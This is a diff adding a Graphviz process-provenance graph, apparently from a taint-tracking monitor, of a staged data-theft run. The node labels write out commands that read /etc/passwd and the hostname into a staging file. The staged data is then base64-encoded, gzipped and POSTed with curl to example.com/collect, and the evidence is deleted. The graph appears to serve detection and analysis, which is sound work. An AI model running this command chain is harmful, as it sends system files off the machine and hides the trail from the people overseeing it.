@@ -1,0 +1,74 @@
+digraph syscon {
+  rankdir=LR;
+  bgcolor="#fafafa";
+  newrank=true;
+  node [fontname="monospace", fontsize=9, margin="0.15,0.1"];
+  edge [fontname="monospace", fontsize=8];
+  graph [nodesep=0.4, ranksep=0.6];
+
+  // Process nodes
+  p2623912 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fff9c4" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n    cat /tmp/staged.txt | base64<BR/>  | gzip &gt; /tmp/payload.gz\n    curl<BR/>  -s -X POST --data-binary<BR/>  @/tmp/payload.gz<BR/>  http://example.com/collect &gt;<BR/>  /dev/null 2&gt;&amp;1 || true\n    rm<BR/>  -f /tmp/staged.txt /tmp/payload.gz<BR/>  /tmp/stage.py\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623912 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623844 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bbdefb" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>chmod</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ chmod +x /tmp/stage.py</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623844 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623877 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>python3</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ python3 /tmp/stage.py</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623877 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623850 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623850 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623921 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -s -X POST --data-binary<BR/>  @/tmp/payload.gz<BR/>  http://example.com/collect</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623921 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623919 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>base64</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ base64</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623919 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623883 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>hostname</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ hostname</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623883 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623922 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>rm</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ rm -f /tmp/staged.txt /tmp/payload.gz<BR/>  /tmp/stage.py</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623922 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623920 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>gzip</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ gzip</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623920 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623918 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /tmp/staged.txt</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623918 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623740 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 300</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623740 | action #0</FONT></TD></TR></TABLE>>];
+  { rank=same; p2623912; p2623740; p2623844; p2623877 }
+
+  // File nodes (data flow mediators)
+  f13789497318489331601 [shape=ellipse, label="/etc/passwd", fillcolor="#ffcdd2", style=filled, color="#666666"];
+  f15844468469708485882 [shape=ellipse, label="/tmp/staged.txt", fillcolor="#ef9a9a", style=filled, color="#666666"];
+  f1860917881087224927 [shape=ellipse, label="/tmp/stage.py", fillcolor="#ef9a9a", style=filled, color="#666666"];
+  f15844303543181164717 [shape=ellipse, label="/tmp/payload.gz", fillcolor="#ef9a9a", style=filled, color="#666666"];
+
+  // Network endpoints
+  n6957319778186358891 [shape=diamond, label="104.18.27.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319735567915914 [shape=diamond, label="104.18.26.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532988036918738 [shape=diamond, label="[2606:4700::6812:1a78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n1660420052178286472 [shape=diamond, label="10.11.12.1:53", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532989328386707 [shape=diamond, label="[2606:4700::6812:1b78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+
+  // Fork/spawn edges
+  p2623844 -> p2623850 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623877 -> p2623883 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623844 -> p2623877 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623912 -> p2623918 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623912 -> p2623920 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623912 -> p2623919 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623912 -> p2623921 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623912 -> p2623922 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623920 -> p2623921 [label="file", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+  p2623877 -> p2623918 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+
+  // Data flow edges
+  f13789497318489331601 -> p2623877 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2623921 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2623877 -> f15844468469708485882 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f15844468469708485882 -> p2623918 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2623922 -> f15844468469708485882 [label="delete", color="#b71c1c", fontcolor="#b71c1c", style=dotted];
+  p2623844 -> f1860917881087224927 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f1860917881087224927 -> p2623877 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2623922 -> f1860917881087224927 [label="delete", color="#b71c1c", fontcolor="#b71c1c", style=dotted];
+  p2623844 -> f1860917881087224927 [label="chmod", color="#6a1b9a", fontcolor="#6a1b9a"];
+  p2623920 -> f15844303543181164717 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f15844303543181164717 -> p2623921 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2623922 -> f15844303543181164717 [label="delete", color="#b71c1c", fontcolor="#b71c1c", style=dotted];
+  // Network edges
+  p2623921 -> n6957319778186358891 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623921 -> n6957319735567915914 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623921 -> n5930532988036918738 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623921 -> n1660420052178286472 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623921 -> n5930532989328386707 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+
+  // Legend
+  subgraph cluster_legend {
+    label="Legend"; style=rounded; color="#cccccc"; fontsize=10;
+    node [shape=plaintext, fontsize=8];
+    legend [label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"><TR><TD BGCOLOR="#bbdefb">Action #1: write staging script</TD></TR><TR><TD BGCOLOR="#c8e6c9">Action #2: python3 /tmp/stage.py</TD></TR><TR><TD BGCOLOR="#fff9c4">Action #3: encode and exfiltrate staged d</TD></TR></TABLE>>];
+  }
+}
